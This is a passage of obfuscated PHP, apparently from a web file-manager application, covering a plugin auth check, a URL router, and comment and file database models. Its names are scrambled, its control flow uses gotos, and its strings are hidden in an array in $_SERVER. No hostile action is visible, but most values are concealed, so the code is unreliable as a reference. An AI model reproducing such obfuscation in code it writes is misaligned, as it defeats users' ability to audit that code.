authCheck($fØ—äÉ¤ó¹ = "\160\154\165\x67\151\156\x41\165\164\150") { $A‡É‹¿±Ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!defined($A‡É‹¿±Ø[442])) { return !1; } if (_get($GLOBALS, $A‡É‹¿±Ø[474])) { return !0; } $FçÂ¹«ˆŒ” = $this->getConfig(); if (!$FçÂ¹«ˆŒ”[$fØ—äÉ¤ó¹]) { return !1; } return ActionCall($A‡É‹¿±Ø[1422], $FçÂ¹«ˆŒ”[$fØ—äÉ¤ó¹]); } public function url($a³·Éô†ƒ’, $CÁ‡ŠÙòâ = '', $AØŒ¨¹ˆŞ¾ = true) { goto e²š·ãŠõÈ; Eæ“İ§­: if (!$AØŒ¨¹ˆŞ¾) { return $f«¨ËĞÍ‚ƒ; } echo $f«¨ËĞÍ‚ƒ; goto d¥‚ã÷öŸ; eÊÕëºÎ: $C„ô¾Ï‚Ì = $this->packageVersion(); $bÚÉÌØ‘¾ = $A ®…ÍëŒÒ . $D´ñâ¹Ğ[428] . $C„ô¾Ï‚Ì; if (substr($a³·Éô†ƒ’, 0, 4) == $D´ñâ¹Ğ[144] || substr($a³·Éô†ƒ’, 0, 2) == $D´ñâ¹Ğ[1205]) { $f«¨ËĞÍ‚ƒ = $a³·Éô†ƒ’ . $D´ñâ¹Ğ[1423] . $bÚÉÌØ‘¾; } else { if ($CÁ‡ŠÙòâ == $D´ñâ¹Ğ[33]) { $f«¨ËĞÍ‚ƒ = $this->pluginHost . $a³·Éô†ƒ’ . $D´ñâ¹Ğ[1423] . $bÚÉÌØ‘¾; } else { if ($CÁ‡ŠÙòâ === $D´ñâ¹Ğ[76]) { $f«¨ËĞÍ‚ƒ = $this->pluginHost . $a³·Éô†ƒ’; } else { if ($CÁ‡ŠÙòâ == $D´ñâ¹Ğ[1424]) { $f«¨ËĞÍ‚ƒ = STATIC_PATH . $a³·Éô†ƒ’ . $D´ñâ¹Ğ[1423] . $A ®…ÍëŒÒ; } else { if ($CÁ‡ŠÙòâ == $D´ñâ¹Ğ[1425]) { $f«¨ËĞÍ‚ƒ = APP_HOST . $D´ñâ¹Ğ[1426] . $a³·Éô†ƒ’ . $D´ñâ¹Ğ[1423] . $A ®…ÍëŒÒ; } else { if (isset($D Ø©Ì³æŒ[$CÁ‡ŠÙòâ])) { $f«¨ËĞÍ‚ƒ = $D Ø©Ì³æŒ[$CÁ‡ŠÙòâ] . $a³·Éô†ƒ’ . $D´ñâ¹Ğ[1423] . $bÚÉÌØ‘¾; } } } } } } goto Eæ“İ§­; e²š·ãŠõÈ: $D´ñâ¹Ğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D Ø©Ì³æŒ = $this->getConfig(); $A ®…ÍëŒÒ = KOD_VERSION . $D´ñâ¹Ğ[91] . KOD_VERSION_BUILD; goto eÊÕëºÎ; d¥‚ã÷öŸ: } public function link($fÍÕšá§Ş› = false, $C”©¢àìœ = '') { $f Õë¥Œ‰’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$fÍÕšá§Ş›) { $this->link($f Õë¥Œ‰’[1427], $f Õë¥Œ‰’[1425]); $this->link($f Õë¥Œ‰’[1428], $f Õë¥Œ‰’[1424]); $this->link($f Õë¥Œ‰’[1429], $f Õë¥Œ‰’[1424]); $this->link($f Õë¥Œ‰’[1430], $f Õë¥Œ‰’[1424]); $this->link($f Õë¥Œ‰’[1431], $f Õë¥Œ‰’[1424]); return; } $dÏÈøŸÏŠö = $this->url($fÍÕšá§Ş›, $C”©¢àìœ, !1); if (substr($fÍÕšá§Ş›, -3) == $f Õë¥Œ‰’[1432]) { echo $f Õë¥Œ‰’[1433] . $dÏÈøŸÏŠö . $f Õë¥Œ‰’[1434] . $f Õë¥Œ‰’[225]; } else { if (substr($fÍÕšá§Ş›, -4) == $f Õë¥Œ‰’[1435]) { echo $f Õë¥Œ‰’[1436] . $dÏÈøŸÏŠö . $f Õë¥Œ‰’[1437] . $f Õë¥Œ‰’[225]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\x5e\x2f\x5d\x2b", "\72\156\165\155" => "\133\x30\x2d\x39\135\x2b", "\x3a\141\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($FÜ››áï’‡, $a÷ö­šø™›) { $bÊ¸ÆÏ†‹š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($FÜ››áï’‡ == $bÊ¸ÆÏ†‹š[1438]) { $eÙ‡ˆŞÉ·™ = array_map($bÊ¸ÆÏ†‹š[1439], $a÷ö­šø™›[0]); $a—´Æ‚ÌŠ = strpos($a÷ö­šø™›[1], $bÊ¸ÆÏ†‹š[8]) === 0 ? $a÷ö­šø™›[1] : $bÊ¸ÆÏ†‹š[8] . $a÷ö­šø™›[1]; $a°¦ÃÁ‹ù = $a÷ö­šø™›[2]; } else { $eÙ‡ˆŞÉ·™ = null; $a—´Æ‚ÌŠ = strpos($a÷ö­šø™›[0], $bÊ¸ÆÏ†‹š[8]) === 0 ? $a÷ö­šø™›[0] : $bÊ¸ÆÏ†‹š[8] . $a÷ö­šø™›[0]; $a°¦ÃÁ‹ù = $a÷ö­šø™›[1]; } array_push(self::$maps, $eÙ‡ˆŞÉ·™); array_push(self::$routes, $a—´Æ‚ÌŠ); array_push(self::$methods, strtoupper($FÜ››áï’‡)); array_push(self::$callbacks, $a°¦ÃÁ‹ù); } public static function error($f³ÙÁš³) { self::$errorCallback = $f³ÙÁš³; } public static function haltOnMatch($fÙ«µëìã = true) { self::$halts = $fÙ«µëìã; } public static function dispatch() { goto A¢Ö•ËÏÅŞ; Fë——øèË: $FªÈ¬†¤²Ç = array_keys(static::$patterns); $bŒÏç¶ˆ À = array_values(static::$patterns); $d£¥‚¡Ëâ = !1; goto dƒ÷â„âÇ”; A¢Ö•ËÏÅŞ: $b§•¡Æ¯É¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C‘œ²Ş¥Í = parse_url($_SERVER[$b§•¡Æ¯É¶[1440]], PHP_URL_PATH); $c×ßªïö  = $_SERVER[$b§•¡Æ¯É¶[154]]; goto Fë——øèË; dƒ÷â„âÇ”: self::$routes = preg_replace($b§•¡Æ¯É¶[1124], $b§•¡Æ¯É¶[8], self::$routes); if (in_array($C‘œ²Ş¥Í, self::$routes)) { $c‚ÔØÀÏªà = array_keys(self::$routes, $C‘œ²Ş¥Í); foreach ($c‚ÔØÀÏªà as $b“›‘ƒ‰¯) { if (self::$methods[$b“›‘ƒ‰¯] == $c×ßªïö  || self::$methods[$b“›‘ƒ‰¯] == $b§•¡Æ¯É¶[1441] || in_array($c×ßªïö , self::$maps[$b“›‘ƒ‰¯])) { $d£¥‚¡Ëâ = !0; if (!is_object(self::$callbacks[$b“›‘ƒ‰¯])) { $Dô™Ú¸õ™´ = explode($b§•¡Æ¯É¶[8], self::$callbacks[$b“›‘ƒ‰¯]); $c¾‹§ÙéÚŞ = end($Dô™Ú¸õ™´); $aî´‚åİ¹® = explode($b§•¡Æ¯É¶[1442], $c¾‹§ÙéÚŞ); $AÈÆ–Û”± = new $aî´‚åİ¹®[0](); $AÈÆ–Û”±->{$aî´‚åİ¹®[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$b“›‘ƒ‰¯]); if (self::$halts) { return; } } } } } else { $bÀ²‹ñçß³ = 0; foreach (self::$routes as $b“›‘ƒ‰¯) { if (strpos($b“›‘ƒ‰¯, $b§•¡Æ¯É¶[4]) !== !1) { $b“›‘ƒ‰¯ = str_replace($FªÈ¬†¤²Ç, $bŒÏç¶ˆ À, $b“›‘ƒ‰¯); } if (preg_match($b§•¡Æ¯É¶[1443] . $b“›‘ƒ‰¯ . $b§•¡Æ¯É¶[1444], $C‘œ²Ş¥Í, $BÚà”Ö¼š¦)) { if (self::$methods[$bÀ²‹ñçß³] == $c×ßªïö  || self::$methods[$bÀ²‹ñçß³] == $b§•¡Æ¯É¶[1441] || !empty(self::$maps[$bÀ²‹ñçß³]) && in_array($c×ßªïö , self::$maps[$bÀ²‹ñçß³])) { $d£¥‚¡Ëâ = !0; array_shift($BÚà”Ö¼š¦); if (!is_object(self::$callbacks[$bÀ²‹ñçß³])) { $Dô™Ú¸õ™´ = explode($b§•¡Æ¯É¶[8], self::$callbacks[$bÀ²‹ñçß³]); $c¾‹§ÙéÚŞ = end($Dô™Ú¸õ™´); $aî´‚åİ¹® = explode($b§•¡Æ¯É¶[1442], $c¾‹§ÙéÚŞ); $AÈÆ–Û”± = new $aî´‚åİ¹®[0](); if (!method_exists($AÈÆ–Û”±, $aî´‚åİ¹®[1])) { echo $b§•¡Æ¯É¶[1445]; } else { call_user_func_array(array($AÈÆ–Û”±, $aî´‚åİ¹®[1]), $BÚà”Ö¼š¦); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$bÀ²‹ñçß³], $BÚà”Ö¼š¦); if (self::$halts) { return; } } } } $bÀ²‹ñçß³++; } } if ($d£¥‚¡Ëâ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aå ·ğ’¶­ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; header($_SERVER[$aå ·ğ’¶­[1446]] . $aå ·ğ’¶­[1447]); echo $aå ·ğ’¶­[1448]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$b§•¡Æ¯É¶[1440]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto cæÎÛ„œĞ; cæÎÛ„œĞ: } } goto AÁ„ëš©Â; fó®“‘Æ: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\145\156\164"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\155\x65" => "\x63\157\155\155\145\x6e\x74\137\x6d\x65\164\141", "\x6d\145\164\141\106\151\x65\154\144" => "\143\157\x6d\x6d\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($eÙ‹ˆŒáÀ½) { $e²¡º±¥° =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($eÙ‹ˆŒáÀ½[$e²¡º±¥°[1678]]) { $D¼Ì‡Š™Ÿƒ = $this->where(array($e²¡º±¥°[1679] => $eÙ‹ˆŒáÀ½[$e²¡º±¥°[1678]]))->find(); if (!$D¼Ì‡Š™Ÿƒ || $D¼Ì‡Š™Ÿƒ[$e²¡º±¥°[387]] != $eÙ‹ˆŒáÀ½[$e²¡º±¥°[387]] || $D¼Ì‡Š™Ÿƒ[$e²¡º±¥°[473]] != $eÙ‹ˆŒáÀ½[$e²¡º±¥°[473]]) { return !1; } $this->where(array($e²¡º±¥°[1679] => $eÙ‹ˆŒáÀ½[$e²¡º±¥°[1678]]))->setAdd($e²¡º±¥°[1680], 1); } $eÙ‹ˆŒáÀ½[$e²¡º±¥°[1681]] = 0; $eÙ‹ˆŒáÀ½[$e²¡º±¥°[1680]] = 0; $eÙ‹ˆŒáÀ½[$e²¡º±¥°[697]] = 1; return $this->add($eÙ‹ˆŒáÀ½); } public function commentCount($FïÉï¿ª²ã, $Aøó„ìƒ©) { goto A¬±Ñ·Ëì®; aŸæëòã§ˆ: return array_to_keyvalue($B¦½‰‘•´, $c“Í–ã¤¾š[473], $c“Í–ã¤¾š[1683]); goto CõÂËâÌ“Â; AÃ¯‡ë‡„Ã: $f¡’©àˆ£² = $c“Í–ã¤¾š[1682]; $Dôî¤¬½Õé = array($c“Í–ã¤¾š[473] => array($c“Í–ã¤¾š[7], $FïÉï¿ª²ã), $c“Í–ã¤¾š[387] => $Aøó„ìƒ©); $B¦½‰‘•´ = $this->field($f¡’©àˆ£²)->where($Dôî¤¬½Õé)->group($c“Í–ã¤¾š[473])->select(); goto aŸæëòã§ˆ; A¬±Ñ·Ëì®: $c“Í–ã¤¾š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$FïÉï¿ª²ã) { return array(); } if (is_string($FïÉï¿ª²ã) || is_int($FïÉï¿ª²ã)) { $FïÉï¿ª²ã = array($FïÉï¿ª²ã); } goto AÃ¯‡ë‡„Ã; CõÂËâÌ“Â: } public function remove($D°Ç¡»šíÖ) { $Bù²šİÆÚó =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F™ÖŞŸÏõ… = array($Bù²šİÆÚó[1679] => $D°Ç¡»šíÖ); $dØ‰Ÿñ¥ = $this->where($F™ÖŞŸÏõ…)->find(); if ($dØ‰Ÿñ¥[$Bù²šİÆÚó[1678]]) { $this->where(array($Bù²šİÆÚó[1679] => $dØ‰Ÿñ¥[$Bù²šİÆÚó[1678]]))->setAdd($Bù²šİÆÚó[1680], -1); } return $this->where($F™ÖŞŸÏõ…)->delete(); } public function edit($f˜ùÏÇƒÉ, $D§ÑéÕ“›İ) { $DÙìšóèìÎ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e¼‹‡ôÁƒ© = array($DÙìšóèìÎ[1679] => $f˜ùÏÇƒÉ); return $this->where($e¼‹‡ôÁƒ©)->save(array($DÙìšóèìÎ[1684] => $D§ÑéÕ“›İ)); } public function prasise($B‰“µÔ»ÉË) { $AÁ›Ê¡ğÑĞ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eŠİ»„®ŸÕ = Model($AÁ›Ê¡ğÑĞ[1685]); $A’Å¸øÍ£Ÿ = array($AÁ›Ê¡ğÑĞ[1679] => $B‰“µÔ»ÉË, $AÁ›Ê¡ğÑĞ[1482] => USER_ID); $déÜÜŸíÖÉ = $eŠİ»„®ŸÕ->where($A’Å¸øÍ£Ÿ)->find(); if (!$déÜÜŸíÖÉ) { $eŠİ»„®ŸÕ->add($A’Å¸øÍ£Ÿ); $CŸ÷‡¢àô¥ = $this->where(array($AÁ›Ê¡ğÑĞ[1679] => $B‰“µÔ»ÉË))->setAdd($AÁ›Ê¡ğÑĞ[1681], 1); } else { $eŠİ»„®ŸÕ->where($A’Å¸øÍ£Ÿ)->delete(); $CŸ÷‡¢àô¥ = $this->where(array($AÁ›Ê¡ğÑĞ[1679] => $B‰“µÔ»ÉË))->setAdd($AÁ›Ê¡ğÑĞ[1681], -1); } return $CŸ÷‡¢àô¥; } public function targetInfo($Dê¹»¼ƒÀ, $b¼¨ÕâŠÑÒ) { goto dÑÊÛÜßğù; dÑÊÛÜßğù: $aùáèæ‰¬¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c„•²ê¾Ñ = array($aùáèæ‰¬¯[538] => $Dê¹»¼ƒÀ, $aùáèæ‰¬¯[539] => $b¼¨ÕâŠÑÒ); $Dß—ãò‘¶ = $this->where($c„•²ê¾Ñ)->count(); goto fá¾”Ì´’ö; fá¾”Ì´’ö: $bæéñâ‘² = "\122\111\x47\110\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\143\x6f\x6d\155\145\156\164\x5f\160\162\x61\x69\x73\145\x20\163\x74\x61\162\x20\x6f\x6e\x20\x63\157\155\155\145\x6e\164\56\143\x6f\155\x6d\145\156\164\x49\x44\40\x3d\x20\x73\164\x61\x72\56\143\157\155\x6d\145\x6e\x74\111\104"; $FŞÅšÔÁïÚ = $this->alias($aùáèæ‰¬¯[348])->where($c„•²ê¾Ñ)->join($bæéñâ‘², $aùáèæ‰¬¯[1686])->count(); $Cõ–âÁ„õ = array($aùáèæ‰¬¯[1687] => $Dß—ãò‘¶, $aùáèæ‰¬¯[1688] => $FŞÅšÔÁïÚ); goto c­ÓÄ¾îÎ; c­ÓÄ¾îÎ: return $Cõ–âÁ„õ; goto BÑ•‰Øªí; BÑ•‰Øªí: } public function listData($f‹ÍÒäßÖë) { $D¨®¡Ë¡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset($f‹ÍÒäßÖë[$D¨®¡Ë¡[1689]])) { if ($f‹ÍÒäßÖë[$D¨®¡Ë¡[1689]]) { $f‹ÍÒäßÖë[$D¨®¡Ë¡[1690]] = array($D¨®¡Ë¡[936], intval($f‹ÍÒäßÖë[$D¨®¡Ë¡[1689]])); } unset($f‹ÍÒäßÖë[$D¨®¡Ë¡[1689]]); } if (isset($f‹ÍÒäßÖë[$D¨®¡Ë¡[1691]])) { if ($f‹ÍÒäßÖë[$D¨®¡Ë¡[1691]]) { $f‹ÍÒäßÖë[$D¨®¡Ë¡[1690]] = array($D¨®¡Ë¡[933], intval($f‹ÍÒäßÖë[$D¨®¡Ë¡[1691]])); } unset($f‹ÍÒäßÖë[$D¨®¡Ë¡[1691]]); } return $this->_listData($f‹ÍÒäßÖë); } private function _listData($DÖƒÌ¹íÄ) { $eÌ‘éà×Ü® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C¡Ú®äŠ = $this->where($DÖƒÌ¹íÄ)->_makeOrder()->selectPage(100); $this->_listAppendParent($C¡Ú®äŠ[$eÌ‘éà×Ü®[361]]); $this->_listAppendUser($C¡Ú®äŠ[$eÌ‘éà×Ü®[361]]); $this->_listAppendMeta($C¡Ú®äŠ[$eÌ‘éà×Ü®[361]]); return $C¡Ú®äŠ; } private function _makeOrder() { $EŸ˜”±Œ°Ò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aÀÂ†ÔŠ = array($EŸ˜”±Œ°Ò[1681], $EŸ˜”±Œ°Ò[1680], $EŸ˜”±Œ°Ò[190]); $cçöÇ—¢İí = Input::get($EŸ˜”±Œ°Ò[423], $EŸ˜”±Œ°Ò[7], $EŸ˜”±Œ°Ò[405], $aÀÂ†ÔŠ); $fóöùµ¼º‘ = Input::get($EŸ˜”±Œ°Ò[424], $EŸ˜”±Œ°Ò[7], $EŸ˜”±Œ°Ò[1484], array($EŸ˜”±Œ°Ò[1692], $EŸ˜”±Œ°Ò[421])); $E™Ç½ù¤Û· = $cçöÇ—¢İí . $EŸ˜”±Œ°Ò[50] . $fóöùµ¼º‘; return $this->order($E™Ç½ù¤Û·); } private function _listAppendParent(&$cìÉäåÀÖ·) { goto Cô«ÈÓÖä; d…Ã™ÏèøŒ: foreach ($cìÉäåÀÖ· as &$D½·—¾İ°) { if (isset($C‚ƒÊ‰…ÚĞ[$D½·—¾İ°[$eˆŒœ÷íœº[1678]]])) { $D½·—¾İ°[$eˆŒœ÷íœº[1693]] = $C‚ƒÊ‰…ÚĞ[$D½·—¾İ°[$eˆŒœ÷íœº[1678]]]; } } unset($D½·—¾İ°); goto e½ÖËŞóÅ; Cô«ÈÓÖä: $eˆŒœ÷íœº =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C•«„³ÇÛ = array_unique(array_to_keyvalue($cìÉäåÀÖ·, $eˆŒœ÷íœº[33], $eˆŒœ÷íœº[1678])); $C•«„³ÇÛ = array_remove_value($C•«„³ÇÛ, $eˆŒœ÷íœº[485]); goto cËè“¬Ğ¬Ë; cËè“¬Ğ¬Ë: if (!$C•«„³ÇÛ) { return; } $C‚ƒÊ‰…ÚĞ = $this->where(array($eˆŒœ÷íœº[1679] => array($eˆŒœ÷íœº[7], $C•«„³ÇÛ)))->select(); $C‚ƒÊ‰…ÚĞ = array_to_keyvalue($C‚ƒÊ‰…ÚĞ, $eˆŒœ÷íœº[1690]); goto d…Ã™ÏèøŒ; e½ÖËŞóÅ: } private function _listAppendUser(&$a‘Çİ˜èğ‡) { goto däŠÊÍêæÛ; F‘ñ˜åæ : foreach ($a‘Çİ˜èğ‡ as &$fÄ—æª—îæ) { $fÄ—æª—îæ[$B²´‰¤˜‡[551]] = $FÒ®áŠß«ó[$fÄ—æª—îæ[$B²´‰¤˜‡[1490]]]; if (isset($fÄ—æª—îæ[$B²´‰¤˜‡[1693]])) { $fÄ—æª—îæ[$B²´‰¤˜‡[1693]][$B²´‰¤˜‡[551]] = $FÒ®áŠß«ó[$fÄ—æª—îæ[$B²´‰¤˜‡[1693]][$B²´‰¤˜‡[1490]]]; } } unset($fÄ—æª—îæ); goto E…ƒ°ªºÃ³; f½øš…’ÇÛ: if (count($BšïŞ´‰ˆô) == 0) { return; } foreach ($a‘Çİ˜èğ‡ as $fÄ—æª—îæ) { if (isset($fÄ—æª—îæ[$B²´‰¤˜‡[1693]])) { $BšïŞ´‰ˆô[] = $fÄ—æª—îæ[$B²´‰¤˜‡[1693]][$B²´‰¤˜‡[1490]]; } } $FÒ®áŠß«ó = Model($B²´‰¤˜‡[494])->userListInfo($BšïŞ´‰ˆô); goto F‘ñ˜åæ ; däŠÊÍêæÛ: $B²´‰¤˜‡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BšïŞ´‰ˆô = array_unique(array_to_keyvalue($a‘Çİ˜èğ‡, $B²´‰¤˜‡[33], $B²´‰¤˜‡[1490])); $BšïŞ´‰ˆô = array_remove_value($BšïŞ´‰ˆô, $B²´‰¤˜‡[485]); goto f½øš…’ÇÛ; E…ƒ°ªºÃ³: } private function _listAppendMeta(&$b›ÀİøğÓß) { goto eŞñï¶’îó; e…È¯İÇ™Ä: if (!$dñïï°¯ßÕ) { return !1; } foreach ($b›ÀİøğÓß as &$f¯¡…ªĞ¢´) { $f¯¡…ªĞ¢´[$f„µï–Šß¦[433]] = $dñïï°¯ßÕ[$f¯¡…ªĞ¢´[$f„µï–Šß¦[1690]]]; if (isset($f¯¡…ªĞ¢´[$f„µï–Šß¦[1693]])) { $f¯¡…ªĞ¢´[$f„µï–Šß¦[1693]][$f„µï–Šß¦[433]] = $dñïï°¯ßÕ[$f¯¡…ªĞ¢´[$f„µï–Šß¦[1693]][$f„µï–Šß¦[1690]]]; } } unset($f¯¡…ªĞ¢´); goto D²ŸÖÎ„ É; eŞñï¶’îó: $f„µï–Šß¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b° ä×‚Œ = array_unique(array_to_keyvalue($b›ÀİøğÓß, $f„µï–Šß¦[33], $f„µï–Šß¦[1690])); $b° ä×‚Œ = array_remove_value($b° ä×‚Œ, $f„µï–Šß¦[485]); goto f®¿á¹õªš; f®¿á¹õªš: if (!$b° ä×‚Œ) { return; } foreach ($b›ÀİøğÓß as $f¯¡…ªĞ¢´) { if (isset($f¯¡…ªĞ¢´[$f„µï–Šß¦[1693]])) { $b° ä×‚Œ[] = $f¯¡…ªĞ¢´[$f„µï–Šß¦[1693]][$f„µï–Šß¦[1690]]; } } $dñïï°¯ßÕ = $this->metaList($b° ä×‚Œ); goto e…È¯İÇ™Ä; D²ŸÖÎ„ É: } private function metaList($cƒ¸ò±íÒ•) { goto bØùïßÚĞˆ; Bæê™¸áëÜ: return $aéÓÙŠµ™ ? $aéÓÙŠµ™ : array(); goto b“µáË‡Ì‚; bØùïßÚĞˆ: $Cø¯¦Â—ïà =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$cƒ¸ò±íÒ•) { return array(); } $eáªâ‹Şå‚ = array($Cø¯¦Â—ïà[1690] => array($Cø¯¦Â—ïà[7], $cƒ¸ò±íÒ•)); goto FãáÃ°‰Ôø; FãáÃ°‰Ôø: $aéÓÙŠµ™ = Model($Cø¯¦Â—ïà[1694])->where($eáªâ‹Şå‚)->select(); $aéÓÙŠµ™ = array_to_keyvalue_group($aéÓÙŠµ™, $Cø¯¦Â—ïà[1690]); foreach ($aéÓÙŠµ™ as $A¸œ››˜‡„ => $EÕÙÌ·ò±ô) { $a¦òÍ¿ˆÜË = array(); foreach ($EÕÙÌ·ò±ô as $DíÕ‹•Ÿœ) { $a¦òÍ¿ˆÜË[$DíÕ‹•Ÿœ[$Cø¯¦Â—ïà[89]]] = $DíÕ‹•Ÿœ[$Cø¯¦Â—ïà[366]]; } $aéÓÙŠµ™[$A¸œ››˜‡„] = $a¦òÍ¿ˆÜË; } goto Bæê™¸áëÜ; b“µáË‡Ì‚: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\154\x65"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\x6d\145" => "\151\157\x5f\146\x69\154\145\x5f\x6d\x65\x74\x61", "\155\x65\x74\x61\106\x69\x65\x6c\144" => "\x66\x69\x6c\x65\x49\104"); public function fileInfo($d«˜œĞÜƒ) { $DÎïêµ¤ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $dÁ²ô§Ğ†Ó = array(); if (!isset($dÁ²ô§Ğ†Ó[$d«˜œĞÜƒ])) { $fÔãÙÂÙÕº = $DÎïêµ¤[1695]; $d¦´á–Á…¤ = Model($DÎïêµ¤[438])->field($fÔãÙÂÙÕº)->where(array($DÎïêµ¤[436] => $d«˜œĞÜƒ))->find(); $dÁ²ô§Ğ†Ó[$d«˜œĞÜƒ] = $d¦´á–Á…¤; } return $dÁ²ô§Ğ†Ó[$d«˜œĞÜƒ]; } public function addFileByContent($d‚ø®Û³¿Ú = '', $D„à‹ŸÖĞ¼ = '') { goto Dœ¥¬é‚Óß; CíçãÊ¦ôÉ: $BëâÅ§‰ˆ = $BòŠÀ…µç… . $F‚ÕŒŸŒ¥[1697] . rand_string(16); file_put_contents($BëâÅ§‰ˆ, $d‚ø®Û³¿Ú); $DŠãƒùãÒœ = $this->addFile($BëâÅ§‰ˆ, $D„à‹ŸÖĞ¼, !0); goto dóçø‘ê©; dóçø‘ê©: if (file_exists($BëâÅ§‰ˆ)) { @unlink($BëâÅ§‰ˆ); } return $DŠãƒùãÒœ; goto cø‡ñ‘Çµõ; Dœ¥¬é‚Óß: $F‚ÕŒŸŒ¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BòŠÀ…µç… = TEMP_PATH . $F‚ÕŒŸŒ¥[1696]; if (!is_dir($BòŠÀ…µç…)) { mk_dir($BòŠÀ…µç…); } goto CíçãÊ¦ôÉ; cø‡ñ‘Çµõ: } public function createFileName($dæ—ô÷ªæÄ) { goto DÅé§³İ¦; a§˜’“šñ: if (!$f˜ßô…‰²Å && !Cache::get($eñ¹âƒ’”ó)) { $f˜ßô…‰²Å = !0; $BŒ…ŒÔË¨÷ = IO::mkdir($bÚ×‡ƒõ‹); if (!IO::exist($BŒ…ŒÔË¨÷ . $A…äÍÒòª[1699])) { IO::mkfile($BŒ…ŒÔË¨÷ . $A…äÍÒòª[1699]); } Cache::set($eñ¹âƒ’”ó, 1, 3600 * 2); } return $d«Ì†¬ø±; goto aØå‚ÑÕ­†; Fë¹°À£°: $bÚ×‡ƒõ‹ = $a–İøâÂ->pathFather($d«Ì†¬ø±); static $f˜ßô…‰²Å = false; $eñ¹âƒ’”ó = $A…äÍÒòª[1698] . md5($bÚ×‡ƒõ‹); goto a§˜’“šñ; DÅé§³İ¦: $A…äÍÒòª =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a–İøâÂ = IO::init($A…äÍÒòª[8]); $d«Ì†¬ø± = $this->makeFilePath($dæ—ô÷ªæÄ, $a–İøâÂ); goto Fë¹°À£°; aØå‚ÑÕ­†: } public function makeFilePath($fÕİ›ßáà, $e”¾”‡êÁ·) { goto A·À¿ä–·—; A·À¿ä–·—: $DŠ¡ÓÚœ’‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BØ‰éŠŠ“« = Model($DŠ¡ÓÚœ’‹[1087])->get($DŠ¡ÓÚœ’‹[1700]); $AÊËóÎ­ = KodIO::defaultIO() . date($DŠ¡ÓÚœ’‹[1701]); goto BÑ›Á—Ñ; Fë¾ËŒ…ˆ: switch ($BØ‰éŠŠ“«) { case $DŠ¡ÓÚœ’‹[1703]: $A¶Œ¹Ç­ƒ = $A¶Œ¹Ç­ƒ . $DŠ¡ÓÚœ’‹[91] . $e”¾”‡êÁ·->ext($fÕİ›ßáà); if ($e”¾”‡êÁ·->ext($fÕİ›ßáà) == $DŠ¡ÓÚœ’‹[1640]) { $A¶Œ¹Ç­ƒ .= $DŠ¡ÓÚœ’‹[1391]; } break; case $DŠ¡ÓÚœ’‹[1704]: goto cŞÇ”ÒÈ¾; BÓí–‡æÛ®: if (IO::isTypeObject($A¶Œ¹Ç­ƒ) && !IO::isUploadServer($A¶Œ¹Ç­ƒ)) { $d¬Ê“ÎÒ‰Œ = IO::setContent($A¶Œ¹Ç­ƒ, $DŠ¡ÓÚœ’‹[33]); if (!$d¬Ê“ÎÒ‰Œ) { show_json($DŠ¡ÓÚœ’‹[1709], !1); } } CacheLock::unlock($AÈË¬ÊÛ®Ï); break; goto f’‰äÄî÷È; cŞÇ”ÒÈ¾: $còÎÜŞÆÏÓ = Model($DŠ¡ÓÚœ’‹[1087])->get($DŠ¡ÓÚœ’‹[1387]); $BƒÌëÈ–ù = substr(md5($DŠ¡ÓÚœ’‹[1705] . $còÎÜŞÆÏÓ . date($DŠ¡ÓÚœ’‹[695])), 0, 8); $A®áº”¶Ó– = KodIO::defaultDriver(); goto A„Èš‰çÁ¡; A„Èš‰çÁ¡: $AÊËóÎ­ = $DŠ¡ÓÚœ’‹[1085] . $A®áº”¶Ó–[$DŠ¡ÓÚœ’‹[383]] . $DŠ¡ÓÚœ’‹[1706] . date($DŠ¡ÓÚœ’‹[1707]) . $BƒÌëÈ–ù . $DŠ¡ÓÚœ’‹[8]; if ($e”¾”‡êÁ·->ext($fÕİ›ßáà) == $DŠ¡ÓÚœ’‹[1640]) { $fÕİ›ßáà .= $DŠ¡ÓÚœ’‹[1391]; } $AÈË¬ÊÛ®Ï = $DŠ¡ÓÚœ’‹[1708] . $AÊËóÎ­ . $fÕİ›ßáà; goto dºÊÈ½ˆ’; dºÊÈ½ˆ’: CacheLock::lock($AÈË¬ÊÛ®Ï); $c‡¡àÁï‘ñ = IO::fileNameAuto($AÊËóÎ­, 